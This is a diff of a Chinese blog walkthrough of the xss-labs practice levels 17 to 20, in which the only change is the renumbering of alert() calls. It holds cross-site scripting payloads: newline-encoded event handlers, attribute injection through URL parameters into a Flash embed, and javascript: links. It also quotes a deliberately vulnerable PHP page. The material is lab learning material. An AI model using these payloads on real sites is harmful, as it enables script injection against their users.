-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&lt;svg%0Aonclick=alert(1)&gt;</span><br><span class="line">&lt;img%0Dsrc=1%0Donerror=alert(1)&gt;</span><br><span class="line">&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;</span><br><span class="line">&lt;ifame%0asrc=1%0aonmouseover=alert(1)&gt;&lt;/ifame&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">&lt;svg%0Aonclick=alert(32)&gt;</span><br><span class="line">&lt;img%0Dsrc=1%0Donerror=alert(33)&gt;</span><br><span class="line">&lt;img%0Asrc=1%0Aonerror=alert(34)&gt;</span><br><span class="line">&lt;ifame%0asrc=1%0aonmouseover=alert(35)&gt;&lt;/ifame&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://upload-images.jianshu.io/upload_images/18851353-2a28bae31ba6e760.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248128780.png"><br><img src="https://upload-images.jianshu.io/upload_images/18851353-c8b911ba89f82644.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248220380.png"><br><img src="https://upload-images.jianshu.io/upload_images/18851353-9385c1bcd2530d7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1570248486260.png"></p>
 <p>看看源码</p>
@@ -585,12 +585,12 @@
 <blockquote>
 <p>弹不出来 ，难受</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看看别人是怎么写的</span><br><span class="line">arg01= onmousemove&amp;arg02=alert(1) ，以追加的形式构成xss脚本，</span><br><span class="line">arg01=1&amp;arg02= onmouseover=alert(1) 直接以事件形式弹&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看看别人是怎么写的</span><br><span class="line">arg01= onmousemove&amp;arg02=alert(36) ，以追加的形式构成xss脚本，</span><br><span class="line">arg01=1&amp;arg02= onmouseover=alert(37) 直接以事件形式弹&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><blockquote>
 <p>和17类似 构造事件, 灵异事件 弹不成功</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">arg01= onmousemove&amp;arg02=alert(1) ，以追加的形式构成xss脚本，</span><br><span class="line">arg01=1&amp;arg02= onmouseover=alert(1) 直接以事件形式弹&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">arg01= onmousemove&amp;arg02=alert(38) ，以追加的形式构成xss脚本，</span><br><span class="line">arg01=1&amp;arg02= onmouseover=alert(39) 直接以事件形式弹&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p>源码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123; </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level19.php?arg01=a&amp;arg02=b&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level18&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">感觉和17差不多，不多说了</span><br></pre></td></tr></table></figure>
@@ -604,10 +604,10 @@
 <p>这道题是flash xss</p>
 </blockquote>
 <p>不咋会做 放上payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(40)&quot;&gt;123&lt;/a&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>不会做</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(41)&quot;&gt;123&lt;/a&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <hr>
 <p>参考文章：</p>
